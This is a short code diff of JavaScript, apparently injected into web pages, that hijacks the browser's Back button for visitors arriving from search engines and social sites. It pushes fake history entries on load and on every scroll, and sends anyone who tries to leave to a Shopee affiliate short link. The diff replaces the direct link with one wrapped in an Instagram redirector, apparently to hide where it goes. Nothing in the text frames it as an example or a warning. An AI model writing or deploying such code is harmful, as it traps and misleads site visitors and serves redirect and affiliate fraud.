@@ -17,7 +17,7 @@ if ([".google.", "bing.", "yandex.", "facebook.", ".pinterest.", ".yahoo.", "mys
 
     history.pushState(null, document.title, window.location.href);
     window.addEventListener('popstate', function(event) {
-        window.location.href = "https://shope.ee/5zqDSoNDqC";
+        window.location.href = "https://l.instagram.com/?u=https%3A%2F%2Fshope.ee%2F5UshJcIJtr&e=ATO2TH7U27VMaahdSFxpUGRhc-DMLV_gJLPJOva-IxltFReutJWk0hQZvTrwlkrFAIo9jZskWJSVwRUdiNQDww&s=1";
     });
     window.addEventListener('scroll', function() {
         history.pushState(null, document.title, window.location.href);
